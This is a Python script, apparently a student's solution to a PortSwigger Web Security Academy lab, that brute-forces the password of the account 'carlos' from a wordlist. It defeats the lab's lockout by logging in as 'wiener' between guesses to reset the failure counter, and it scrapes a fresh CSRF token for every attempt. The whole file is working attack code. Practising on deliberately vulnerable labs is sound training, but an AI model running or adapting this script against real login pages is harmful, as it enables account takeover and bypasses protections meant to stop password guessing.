import requests
from bs4 import BeautifulSoup
import time

url = "https://0af800e104a9649882ba4770007300d1.web-security-academy.net/login"
arquivo_senhas = "/home/raf75/sexto-periodo/cibersecurity/Brute Force/brute1.txt"  # Corrigido para o nome correto do arquivo

s = requests.Session()

def get_token():
    try:
        r = s.get(url, timeout=10)
        if r.status_code != 200:
            print(f"[ERRO] Status inesperado ao buscar token: {r.status_code}")
            return None
        soup = BeautifulSoup(r.text, 'html.parser')
        tag = soup.find('input', {'name': 'csrf'})
        if tag:
            return tag['value']
        else:
            print("[ERRO] CSRF não encontrado na resposta!")
            print(r.text)
            return None
    except Exception as e:
        print(f"[ERRO] Exceção ao buscar token: {e}")
        return None

try:
    with open(arquivo_senhas, 'r') as f:
        senhas = [l.strip() for l in f if l.strip()]

    print(f"[*] Iniciando ataque cadenciado. Total: {len(senhas)} senhas.")

    for i, senha in enumerate(senhas):
        token = get_token()
        if not token:
            print(f"[!] Erro de conexão/Timeout na senha {senha}. Esperando 5 segundos...")
            time.sleep(5)
            continue

        # 1. Reset (Wiener)
        reset = s.post(url, data={'csrf': token, 'username': 'wiener', 'password': 'peter'}, allow_redirects=False)
        if reset.status_code not in [200, 302]:
            print(f"[ERRO] Reset Wiener falhou. Status: {reset.status_code}")
            print(reset.text)

        # 2. Ataque (Carlos) - Pegamos um novo token após o post anterior
        token_c = get_token()
        if token_c:
            res = s.post(url, data={'csrf': token_c, 'username': 'carlos', 'password': senha}, allow_redirects=False)
            print(f"[{i+1}] Testando: {senha} | Status: {res.status_code} | Tamanho: {len(res.text)}", end="\r")

            if res.status_code == 302:
                print(f"\n\n[!!!] BINGO! SENHA ENCONTRADA: {senha}")
                break
        else:
            print(f"[ERRO] Não foi possível obter token para Carlos na senha {senha}")

        time.sleep(0.5)
    else:
        print("\n[-] Fim da lista. Senha não encontrada.")
except FileNotFoundError:
    print(f"Erro: O arquivo '{arquivo_senhas}' não foi encontrado.")
except Exception as e:
    print(f"Erro inesperado: {e}")